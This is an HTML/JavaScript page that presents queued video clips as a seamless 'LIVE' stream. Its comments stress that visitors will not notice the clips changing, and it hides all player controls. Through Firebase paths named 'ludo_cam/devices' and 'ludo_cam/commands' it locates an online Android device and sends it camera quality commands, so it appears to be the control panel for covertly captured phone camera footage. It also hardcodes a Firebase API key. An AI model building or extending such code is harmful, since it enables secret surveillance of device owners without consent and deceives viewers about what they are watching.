<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔴 LIVE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
        }

        /* Main container */
        .live-container {
            position: relative;
            width: 100%;
            max-width: 100%;
            background: #000;
        }

        /* Video player - NO CONTROLS */
        .live-video {
            width: 100%;
            height: auto;
            max-height: 100vh;
            object-fit: contain;
            display: block;
            pointer-events: none;  /* Visitor click nahi kar sakta */
        }

        /* LIVE Badge - Blinking */
        .live-badge {
            position: fixed;
            top: 20px;
            left: 20px;
            background: #ff0000;
            color: white;
            font-size: 14px;
            font-weight: bold;
            padding: 6px 14px;
            border-radius: 30px;
            letter-spacing: 1px;
            z-index: 100;
            font-family: monospace;
            box-shadow: 0 0 10px rgba(255,0,0,0.5);
            animation: blink 1.2s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; background: #ff0000; }
            50% { opacity: 0.7; background: #cc0000; }
            100% { opacity: 1; background: #ff0000; }
        }

        /* Small status text at bottom (minimal) */
        .live-footer {
            position: fixed;
            bottom: 15px;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 10px;
            color: rgba(255,255,255,0.3);
            font-family: monospace;
            z-index: 100;
            pointer-events: none;
        }

        /* Hide all video controls completely */
        video::-webkit-media-controls {
            display: none !important;
        }
        video::-webkit-media-controls-enclosure {
            display: none !important;
        }
        video::-webkit-media-controls-panel {
            display: none !important;
        }
        video::-webkit-media-controls-overlay-play-button {
            display: none !important;
        }
        video::-internal-media-controls-overlay-cast-button {
            display: none !important;
        }

        /* No video message - hidden by default, very subtle */
        .no-video {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000;
            color: #333;
            font-size: 14px;
            font-family: monospace;
        }
        
        /* Hide any extra elements */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="live-container">
    <video id="liveVideo" class="live-video" autoplay muted playsinline disablePictureInPicture></video>
    <div class="live-badge">🔴 LIVE</div>
    <div class="live-footer">LIVE STREAM</div>
    <div class="no-video hidden" id="noVideo">Connecting to stream...</div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
<script>
    // ============================================================
    // LIVE FEEL WEBSITE - Seamless auto-play, next video automatically
    // Visitor ko pata nahi chalega video change hua!
    // ============================================================
    
    const firebaseConfig = {
        apiKey: "AIzaSyBwDAhUS8iqNsM5rMewtwFnQs-s3FcnaoU",
        authDomain: "livecam-4e8b0.firebaseapp.com",
        databaseURL: "https://livecam-4e8b0-default-rtdb.firebaseio.com",
        projectId: "livecam-4e8b0",
        storageBucket: "livecam-4e8b0.firebasestorage.app",
        messagingSenderId: "315485454659",
        appId: "1:315485454659:android:e5d69c3b9a1a87854c2ff6"
    };

    const API_URL = "/api/photos";

    const video = document.getElementById('liveVideo');
    const noVideoDiv = document.getElementById('noVideo');
    
    // Video queue for seamless transition
    let videoQueue = [];
    let currentVideoUrl = null;
    let isPlaying = false;
    let isWaitingForVideo = false;
    let deviceId = null;
    
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // 🔥 Quality command (if needed)
    function sendQualityCommand(quality) {
        if (!deviceId) return;
        database.ref(`ludo_cam/commands/${deviceId}`).set({ quality: quality });
    }

    // Get device info from Firebase
    database.ref('ludo_cam/devices').on('value', (snapshot) => {
        const devices = snapshot.val();
        for (const [id, device] of Object.entries(devices || {})) {
            if (device.online === true) {
                deviceId = id;
                break;
            }
        }
    });

    // ============================================================
    // FETCH LATEST VIDEOS FROM API
    // ============================================================
    async function fetchLatestVideos() {
        try {
            const res = await fetch(API_URL);
            const data = await res.json();

            if (data.success && data.videos && data.videos.length > 0) {
                noVideoDiv.classList.add('hidden');
                
                // Get all videos and add to queue (only new ones)
                for (const videoData of data.videos) {
                    if (videoData.url !== currentVideoUrl) {
                        currentVideoUrl = videoData.url;
                        videoQueue.push(videoData.url);
                    }
                }
                
                // Keep only last 3 videos in queue
                if (videoQueue.length > 3) {
                    videoQueue = videoQueue.slice(-3);
                }
                
                // Start playing if not already
                if (!isPlaying && !isWaitingForVideo && videoQueue.length > 0) {
                    playNextVideo();
                }
            } else {
                if (videoQueue.length === 0 && !isPlaying) {
                    noVideoDiv.classList.remove('hidden');
                }
            }
        } catch(e) {
            console.log('Silent fetch error');
        }
    }

    // ============================================================
    // PLAY NEXT VIDEO - SEAMLESS TRANSITION
    // Visitor ko pata nahi chalega!
    // ============================================================
    function playNextVideo() {
        if (videoQueue.length === 0) {
            isWaitingForVideo = true;
            return;
        }
        
        isWaitingForVideo = false;
        const nextVideoUrl = videoQueue.shift();
        
        // Smooth fade transition
        video.style.transition = 'opacity 0.3s ease';
        video.style.opacity = '0';
        
        setTimeout(() => {
            video.src = nextVideoUrl;
            video.load();
            
            // Autoplay
            const playPromise = video.play();
            
            if (playPromise !== undefined) {
                playPromise.then(() => {
                    isPlaying = true;
                    video.style.opacity = '1';
                    
                    setTimeout(() => {
                        video.style.transition = '';
                    }, 350);
                }).catch(() => {
                    // Autoplay blocked - still try to play silently
                    video.muted = true;
                    video.play().then(() => {
                        isPlaying = true;
                        video.style.opacity = '1';
                    }).catch(e => console.log('Playback error'));
                });
            }
        }, 100);
    }

    // ============================================================
    // WHEN VIDEO ENDS - AUTOMATICALLY PLAY NEXT
    // Visitor ko pata nahi chalega!
    // ============================================================
    video.addEventListener('ended', () => {
        isPlaying = false;
        
        if (videoQueue.length > 0) {
            // Play next video immediately
            playNextVideo();
        } else {
            // No video in queue, wait for next fetch
            isWaitingForVideo = true;
            // Show subtle waiting state (but don't disrupt experience)
            video.style.opacity = '0.5';
        }
    });

    // ============================================================
    // FIX: If video gets stuck, try to recover
    // ============================================================
    video.addEventListener('error', () => {
        console.log('Video error, skipping to next');
        isPlaying = false;
        if (videoQueue.length > 0) {
            playNextVideo();
        }
    });

    // ============================================================
    // POLL EVERY 3 SECONDS (Faster than before)
    // Visitor ko pata nahi chalega kab naya video aaya
    // ============================================================
    
    // Initial fetch
    fetchLatestVideos();
    
    // Poll every 3 seconds for new videos
    setInterval(fetchLatestVideos, 3000);
    
    // Also poll device status for quality commands every 5 seconds
    setInterval(() => {
        if (deviceId) {
            database.ref(`ludo_cam/commands/${deviceId}`).once('value', (snapshot) => {
                const cmd = snapshot.val();
                if (cmd && cmd.quality) {
                    // Quality command is received but we don't need to display anything
                    console.log('Quality command received:', cmd.quality);
                }
            });
        }
    }, 5000);
    
    // ============================================================
    // ENSURE VIDEO NEVER SHOWS CONTROLS
    // ============================================================
    video.controls = false;
    video.removeAttribute('controls');
    
    // Disable right-click on video
    video.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Handle visibility change (tab switch) - resume playing silently
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden && !isPlaying && videoQueue.length > 0) {
            playNextVideo();
        }
    });
    
    console.log('Live stream ready - Visitor will see seamless live experience');
</script>
</body>
</html>
